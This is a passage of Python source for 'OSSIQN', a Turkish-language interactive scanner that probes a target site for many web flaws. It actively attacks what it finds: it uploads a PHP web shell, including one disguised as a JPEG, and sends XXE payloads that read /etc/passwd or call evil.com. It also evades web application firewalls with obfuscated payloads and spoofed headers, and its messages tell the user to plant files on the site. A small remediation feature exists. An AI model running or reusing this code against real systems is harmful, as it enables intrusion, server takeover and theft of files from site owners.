                    return {"type": "command_injection", "details": f"Command injection bulundu: {test_url}. Payloadi otomatik at: {payload}. Dosyanizi siteye yerlestirmek icin: Cmd parametresine {payload} ekleyin. Exploit: {self.exploit_db['command_injection']['exploit']}"}
                if self.waf_present:
                    bypassed = self.bypass_waf(test_url, payload, "cmd")
                    if bypassed:
                        logging.info(f"Command injection WAF bypass ile bulundu: {test_url}, Bypassed Payload: {bypassed}")
                        return {"type": "command_injection", "details": f"Command injection bulundu (WAF bypass): {test_url}. Payloadi otomatik at: {bypassed}. Dosyanizi siteye yerlestirmek icin: Cmd parametresine {bypassed} ekleyin. Exploit: {self.exploit_db['command_injection']['exploit']}"}
            except Exception as e:
                logging.error(f"Command injection tarama hatasi: {e}")
        return None

    def custom_xxe_scan(self, url):
        xml_payloads = [
            """<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>\n<root>&xxe;</root>""",
            """<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://evil.com/data"> ]>\n<root>&xxe;</root>""",
            """<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe; ]>\n<root></root>"""
        ]
        for xml_payload in xml_payloads:
            try:
                response = requests.post(url, data=xml_payload, headers={"Content-Type": "application/xml"}, timeout=3)
                if "root:" in response.text or "evil.com" in response.text:
                    logging.info(f"XXE bulundu: {url}, Payload: XML payload")
                    return {"type": "xxe", "details": f"XXE bulundu: {url}. Payloadi otomatik at: XML payload. Dosyanizi siteye yerlestirmek icin: XML input'una payload ekleyin. Exploit: {self.exploit_db['xxe']['exploit']}"}
                if self.waf_present:
                    bypassed = self.bypass_waf(url, xml_payload, "", method="POST")
                    if bypassed:
                        logging.info(f"XXE WAF bypass ile bulundu: {url}, Bypassed Payload: {bypassed}")
                        return {"type": "xxe", "details": f"XXE bulundu (WAF bypass): {url}. Payloadi otomatik at: {bypassed}. Dosyanizi siteye yerlestirmek icin: XML input'una {bypassed} ekleyin. Exploit: {self.exploit_db['xxe']['exploit']}"}
            except Exception as e:
                logging.error(f"XXE tarama hatasi: {e}")
        return None

    def custom_file_upload_scan(self, url):
        upload_url = f"{url}/upload"
        files = [
            {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>')},
            {'file': ('test.jpg', '<?php system($_GET["cmd"]); ?>', 'image/jpeg')}
        ]
        for file_data in files:
            try:
                response = requests.post(upload_url, files=file_data, timeout=3)
                if response.status_code == 200 and "uploaded" in response.text.lower():
                    uploaded_path = re.search(r'uploaded to (.*)', response.text)
                    path = uploaded_path.group(1) if uploaded_path else "unknown path"
                    logging.info(f"Dosya yukleme zafiyeti bulundu: {upload_url}, Path: {path}")
                    return {"type": "file_upload", "details": f"Dosya yukleme zafiyeti bulundu: {upload_url}. Payloadi otomatik at: shell.php. Dosyanizi siteye yerlestirmek icin: Upload formuna shell.php yukleyin, yol: {path}. Exploit: {self.exploit_db['file_upload']['exploit']}"}
                if self.waf_present:
                    bypassed = self.bypass_waf(upload_url, "shell.php", "", method="POST")
                    if bypassed:
                        logging.info(f"Dosya yukleme zafiyeti WAF bypass ile bulundu: {upload_url}, Bypassed Payload: {bypassed}")
                        return {"type": "file_upload", "details": f"Dosya yukleme zafiyeti bulundu (WAF bypass): {upload_url}. Payloadi otomatik at: {bypassed}. Dosyanizi siteye yerlestirmek icin: Upload formuna {bypassed} yukleyin."}
            except Exception as e:
                logging.error(f"Dosya yukleme tarama hatasi: {e}")
        return None

    def custom_waf_detect(self, url):
        waf_payloads = ["<script>alert(1)</script>", "' OR 1=1--", "../etc/passwd", ";ls", "http://localhost"]
        waf_signatures = ["cloudflare", "mod_security", "incapsula", "f5 big-ip", "akamai", "waf detected", "blocked", "forbidden"]
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Referer": "http://google.com"
        }
        for payload in waf_payloads:
            test_url = f"{url}?test={urllib.parse.quote(payload)}"
            try:
                response = requests.get(test_url, timeout=3, headers=headers)
                if response.status_code in [403, 406, 429] or any(sig in response.text.lower() for sig in waf_signatures):
                    waf_name = next((sig for sig in waf_signatures if sig in response.text.lower()), "unknown WAF")
                    logging.info(f"WAF tespit edildi: {waf_name}")
                    return {"type": "waf_detect", "details": f"WAF tespit edildi: {waf_name}. WAF bypass icin: Payloadlari obfuscate edin, header manipulasyonu yapin."}
            except Exception as e:
                logging.error(f"WAF tarama hatasi: {e}")
        return None

    def bypass_waf(self, url, payload, param, method="GET"):
        bypass_techniques = [
            (payload, {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"}),
            (urllib.parse.quote(payload), {"User-Agent": "Googlebot/2.1 (+http://www.google.com/bot.html)"}),
            (urllib.parse.quote(urllib.parse.quote(payload)), {"Referer": "http://trusted.com"}),
            (payload.replace('<', '<%00'), {"X-Forwarded-For": "127.0.0.1"}),
            (payload.upper(), {"Accept": "*/*"}),
            (payload.replace(' ', '/**/'), {"Content-Type": "application/x-www-form-urlencoded"}),
            (payload.replace("'", "%27"), {"User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"}),
            (payload.replace('OR', 'O%52'), {"Referer": "http://example.com"}),
            (payload, {"User-Agent": "curl/7.68.0"}, {"delay": 0.5}),
            (payload.replace('<script>', '<scr%69pt>'), {"Accept-Encoding": "gzip, deflate"})
        ]
        for bypassed_payload, headers, *extra in bypass_techniques:
            test_url = f"{url}?{param}={urllib.parse.quote(bypassed_payload)}" if param else f"{url}{bypassed_payload}"
            try:
                if method == "POST":
                    response = requests.post(url, data={param: bypassed_payload}, headers=headers, timeout=5)
                else:
                    response = requests.get(test_url, headers=headers, timeout=5)
                if extra and "delay" in extra[0]:
                    time.sleep(extra[0]["delay"])
                if "alert(1)" in response.text or "root:" in response.text or "bin" in response.text or response.status_code == 200:
                    logging.info(f"WAF bypass basarili: Payload: {bypassed_payload}, Headers: {headers}")
                    return bypassed_payload
            except Exception as e:
                logging.error(f"WAF bypass hatasi: {e}")
        return None

    def scan_target(self, url):
        print(f"\n{Fore.YELLOW}[*] Tarama Baslatiliyor...{Style.RESET_ALL}")
        logging.info(f"Tarama baslatiliyor: {url}")
        
        try:
            if url.startswith('http://') or url.startswith('https://'):
                target_url = url
            else:
                target_url = f"{self.target_protocol}://{url}"
            
            print(f"{Fore.GREEN}HEDEF BILGILERI{Style.RESET_ALL}")
            print(f"URL: {Fore.CYAN}{target_url}{Style.RESET_ALL}")
            logging.info(f"Hedef URL: {target_url}")
            
            self.detected_vulns = []
            host = urllib.parse.urlparse(target_url).hostname
            
            print(f"{Fore.YELLOW}[*] WAF tarama...{Style.RESET_ALL}")
            waf_vuln = self.custom_waf_detect(target_url)
            if waf_vuln:
                self.detected_vulns.append(waf_vuln)
                self.waf_present = True
                print(f"{Fore.YELLOW}[*] WAF tespit edildi, bypass teknikleri uygulanacak...{Style.RESET_ALL}")
            else:
                self.waf_present = False
            
            print(f"{Fore.YELLOW}[*] Port tarama...{Style.RESET_ALL}")
            ports_vuln = self.custom_open_ports_scan(host)
            if ports_vuln:
                self.detected_vulns.append(ports_vuln)
            
            print(f"{Fore.YELLOW}[*] XSS tarama...{Style.RESET_ALL}")
            xss_vuln = self.custom_xss_scan(target_url)
            if xss_vuln:
                self.detected_vulns.append(xss_vuln)
            
            print(f"{Fore.YELLOW}[*] SQLi tarama...{Style.RESET_ALL}")
            sqli_vuln = self.custom_sqli_scan(target_url)
            if sqli_vuln:
                self.detected_vulns.append(sqli_vuln)
            
            print(f"{Fore.YELLOW}[*] LFI tarama...{Style.RESET_ALL}")
            lfi_vuln = self.custom_lfi_scan(target_url)
            if lfi_vuln:
                self.detected_vulns.append(lfi_vuln)
            
            print(f"{Fore.YELLOW}[*] RFI tarama...{Style.RESET_ALL}")
            rfi_vuln = self.custom_rfi_scan(target_url)
            if rfi_vuln:
                self.detected_vulns.append(rfi_vuln)
            
            print(f"{Fore.YELLOW}[*] SSRF tarama...{Style.RESET_ALL}")
            ssrf_vuln = self.custom_ssrf_scan(target_url)
            if ssrf_vuln:
                self.detected_vulns.append(ssrf_vuln)
            
            print(f"{Fore.YELLOW}[*] Dir traversal tarama...{Style.RESET_ALL}")
            dir_vuln = self.custom_dir_traversal_scan(target_url)
            if dir_vuln:
                self.detected_vulns.append(dir_vuln)
            
            print(f"{Fore.YELLOW}[*] Subdomain tarama...{Style.RESET_ALL}")
            subdomain_vuln = self.custom_subdomain_scan(host)
            if subdomain_vuln:
                self.detected_vulns.append(subdomain_vuln)
            
            print(f"{Fore.YELLOW}[*] HTTP baslik tarama...{Style.RESET_ALL}")
            headers_vuln = self.custom_http_headers_scan(target_url)
            if headers_vuln:
                self.detected_vulns.append(headers_vuln)
            
            print(f"{Fore.YELLOW}[*] CMS tespiti...{Style.RESET_ALL}")
            cms_vuln = self.custom_cms_detect(target_url)
            if cms_vuln:
                self.detected_vulns.append(cms_vuln)
            
            print(f"{Fore.YELLOW}[*] Brute force tarama...{Style.RESET_ALL}")
            brute_vuln = self.custom_brute_force_scan(target_url)
            if brute_vuln:
                self.detected_vulns.append(brute_vuln)
            
            print(f"{Fore.YELLOW}[*] SSL/TLS tarama...{Style.RESET_ALL}")
            ssl_vuln = self.custom_ssl_tls_scan(host)
            if ssl_vuln:
                self.detected_vulns.append(ssl_vuln)
            
            print(f"{Fore.YELLOW}[*] Web crawling...{Style.RESET_ALL}")
            crawl_vuln = self.custom_web_crawl(target_url)
            if crawl_vuln:
                self.detected_vulns.append(crawl_vuln)
            
            print(f"{Fore.YELLOW}[*] Turkce CMS tarama...{Style.RESET_ALL}")
            tr_cms_vuln = self.custom_tr_cms_scan(target_url)
            if tr_cms_vuln:
                self.detected_vulns.append(tr_cms_vuln)
            
            print(f"{Fore.YELLOW}[*] API zafiyet tarama...{Style.RESET_ALL}")
            api_vuln = self.custom_api_vuln_scan(target_url)
            if api_vuln:
                self.detected_vulns.append(api_vuln)
            
            print(f"{Fore.YELLOW}[*] IDOR tarama...{Style.RESET_ALL}")
            idor_vuln = self.custom_idor_scan(target_url)
            if idor_vuln:
                self.detected_vulns.append(idor_vuln)
            
            print(f"{Fore.YELLOW}[*] CSRF tarama...{Style.RESET_ALL}")
            csrf_vuln = self.custom_csrf_scan(target_url)
            if csrf_vuln:
                self.detected_vulns.append(csrf_vuln)
            
            print(f"{Fore.YELLOW}[*] Open redirect tarama...{Style.RESET_ALL}")
            redirect_vuln = self.custom_open_redirect_scan(target_url)
            if redirect_vuln:
                self.detected_vulns.append(redirect_vuln)
            
            print(f"{Fore.YELLOW}[*] Command injection tarama...{Style.RESET_ALL}")
            cmd_vuln = self.custom_command_injection_scan(target_url)
            if cmd_vuln:
                self.detected_vulns.append(cmd_vuln)
            
            print(f"{Fore.YELLOW}[*] XXE tarama...{Style.RESET_ALL}")
            xxe_vuln = self.custom_xxe_scan(target_url)
            if xxe_vuln:
                self.detected_vulns.append(xxe_vuln)
            
            print(f"{Fore.YELLOW}[*] File upload tarama...{Style.RESET_ALL}")
            upload_vuln = self.custom_file_upload_scan(target_url)
            if upload_vuln:
                self.detected_vulns.append(upload_vuln)
            
            print(f"{Fore.GREEN}[+] Tarama tamamlandi. Bulunan aciklar: {len(self.detected_vulns)}{Style.RESET_ALL}")
            logging.info(f"Tarama tamamlandi, bulunan aciklar: {len(self.detected_vulns)}")
            
            if self.detected_vulns:
                self.save_report()

        except Exception as e:
            print(f"{Fore.RED}[!] Tarama hatasi: {e}{Style.RESET_ALL}")
            logging.error(f"Tarama hatasi: {e}")

    def show_vulns(self):
        if not self.detected_vulns:
            print(f"{Fore.RED}[!] Henuz acik tespit edilmedi. Once scan yapin.{Style.RESET_ALL}")
            logging.warning("Vulns komutu: Henuz acik tespit edilmedi")
            return
        
        print(f"\n{Fore.CYAN}[*] Tespit Edilen Aciklar{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}{'=' * 50}{Style.RESET_ALL}")
        for i, vuln in enumerate(self.detected_vulns, 1):
            vuln_info = self.vulns.get(vuln['type'], {})
            print(f"VULN # {i}")
            print(f"Isim: {vuln_info.get('name', 'Bilinmiyor')}")
            print(f"Risk: {vuln_info.get('risk', 'Bilinmiyor')}")
            print(f"Detaylar: {vuln['details']}")
            print()
            logging.info(f"Vuln #{i}: {vuln_info.get('name')} - {vuln['details']}")

    def show_fix(self, vuln_number):
        if not self.detected_vulns:
            print(f"{Fore.RED}[!] Once tarama yapin: scan{Style.RESET_ALL}")
            return
        
        try:
            index = int(vuln_number) - 1
            if 0 <= index < len(self.detected_vulns):
                target_vuln = self.detected_vulns[index]
                vuln_type = target_vuln['type']
                vuln_name = self.vulns.get(vuln_type, {}).get('name', 'Bilinmeyen Acik')
                fix_info = self.remediations.get(vuln_type, 'Bu acik icin ozel bir cozum onerisi bulunamadi.')
                
                print(f"\n{Fore.GREEN}[+] Cozum Onerisi: {vuln_name}{Style.RESET_ALL}")
                print(f"{Fore.MAGENTA}{'=' * 50}{Style.RESET_ALL}")
                print(f"{Fore.CYAN}Nasil Kapatilir:{Style.RESET_ALL} {fix_info}")
                print(f"{Fore.MAGENTA}{'=' * 50}{Style.RESET_ALL}\n")
                logging.info(f"Fix gosterildi: {vuln_name}")
            else:
                print(f"{Fore.RED}[!] Gecersiz vuln numarasi{Style.RESET_ALL}")
        except ValueError:
            print(f"{Fore.RED}[!] Lutfen bir sayi girin{Style.RESET_ALL}")

    def use_vuln(self, vuln_number):
        if not self.detected_vulns:
            print(f"{Fore.RED}[!] Once tarama yapin: scan{Style.RESET_ALL}")
            logging.warning("Use vuln: Once tarama yapin")
            return
        
        try:
            index = int(vuln_number) - 1
            if 0 <= index < len(self.detected_vulns):
                self.current_vuln = self.detected_vulns[index]
                print(f"{Fore.GREEN}[+] Vuln secildi: {self.current_vuln['type']}{Style.RESET_ALL}")
                logging.info(f"Vuln secildi: {self.current_vuln['type']}")
            else:
                print(f"{Fore.RED}[!] Gecersiz vuln numarasi{Style.RESET_ALL}")
                logging.error("Gecersiz vuln numarasi")
        except ValueError:
            print(f"{Fore.RED}[!] Sayi girin{Style.RESET_ALL}")
            logging.error("Use vuln: Sayi girin")

    def show_options(self):
        if not self.current_vuln:
            print(f"{Fore.RED}[!] Once vuln secin{Style.RESET_ALL}")
            logging.warning("Show options: Once vuln secin")
            return
        
        print(f"\n{Fore.CYAN}[*] Secilen Vuln Detaylari{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}{'=' * 50}{Style.RESET_ALL}")
        vuln_info = self.vulns.get(self.current_vuln['type'], {})
        print(f"Isim: {vuln_info.get('name')}")
        print(f"Risk: {vuln_info.get('risk')}")
        print(f"Tip: {vuln_info.get('type')}")
        print(f"Detaylar: {self.current_vuln['details']}")
        logging.info(f"Show options: {vuln_info.get('name')} - {self.current_vuln['details']}")

    def help(self):
        print(f"\n{Fore.CYAN}[*] OSSIQN - Yardim{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}{'=' * 50}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Komutlar:{Style.RESET_ALL}")
        print(f"  set URL <url>         - Hedef URL ayarla")
        print(f"  set PORT_RANGE <start-end> - Port araligi ayarla")
        print(f"  set WORDLIST <file>   - Subdomain/crawl icin wordlist ayarla")
        print(f"  scan                  - Tarama yap")
        print(f"  vulns                 - Tespit edilen aciklari listele")
        print(f"  use <number>          - Acik sec")
        print(f"  fix <number>          - Acigin nasil kapatilacagini goster (YENI)")
        print(f"  show options          - Detaylari goster")
        print(f"  help                  - Yardim")
        print(f"  exit                  - Cikis")

    def main_loop(self):
        self.banner()
        
        while True:
            try:
                command = input(f"{Fore.RED}ossiqn{Style.RESET_ALL} > ").strip()
                logging.info(f"Komut alindi: {command}")
                
                if not command:
                    continue
                
                parts = command.split()
                cmd = parts[0].lower()
                
                if cmd == "exit":
                    print(f"{Fore.YELLOW}[*] Cikis yapiliyor...{Style.RESET_ALL}")
                    logging.info("Cikis yapiliyor")
                    break
                
                elif cmd == "help":
                    self.help()
                
                elif cmd == "set":
                    if len(parts) < 3:
                        print(f"{Fore.RED}[!] Kullanim: set <option> <value>{Style.RESET_ALL}")
                        continue
                    
                    option = parts[1].upper()
                    value = parts[2]
                    
                    if option == "URL":
                        self.target_url = value
                        print(f"{Fore.GREEN}[+] URL: {value}{Style.RESET_ALL}")
                    elif option == "PORT_RANGE":
                        try:
                            start, end = map(int, value.split('-'))
                            self.target_port_range = (start, end)
                            print(f"{Fore.GREEN}[+] PORT_RANGE: {start}-{end}{Style.RESET_ALL}")
                        except ValueError:
                            print(f"{Fore.RED}[!] Gecersiz port araligi formati: start-end{Style.RESET_ALL}")
                    elif option == "WORDLIST":
                        try:
                            with open(value, 'r') as f:
                                self.wordlist = [line.strip() for line in f if line.strip()]
                            print(f"{Fore.GREEN}[+] Wordlist yuklendi: {value}{Style.RESET_ALL}")
                        except:
                            print(f"{Fore.RED}[!] Wordlist dosyasi okunamadi{Style.RESET_ALL}")
                
                elif cmd == "scan":
                    if not self.target_url:
                        print(f"{Fore.RED}[!] Once URL ayarla: set URL <url>{Style.RESET_ALL}")
                        continue
                    
                    self.scan_target(self.target_url)
                
                elif cmd == "vulns":
                    self.show_vulns()
                
                elif cmd == "use":
                    if len(parts) < 2:
                        print(f"{Fore.RED}[!] Kullanim: use <number>{Style.RESET_ALL}")
                        continue
                    
                    self.use_vuln(parts[1])
                
                elif cmd == "fix":
                    if len(parts) < 2:
                        print(f"{Fore.RED}[!] Kullanim: fix <number>{Style.RESET_ALL}")
                        continue
                    
                    self.show_fix(parts[1])
                
                elif cmd == "show" and len(parts) > 1 and parts[1] == "options":
                    self.show_options()
                
                else:
                    print(f"{Fore.RED}[!] Bilinmeyen komut: {cmd}{Style.RESET_ALL}")
                    print("Yardim icin 'help' yazin")
                
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[*] Cikis yapiliyor...{Style.RESET_ALL}")
                break
            except Exception as e:
                print(f"{Fore.RED}[!] Hata: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    logging.info("OSSIQN baslatildi")
    scanner = OssiqnScanner()
    scanner.main_loop()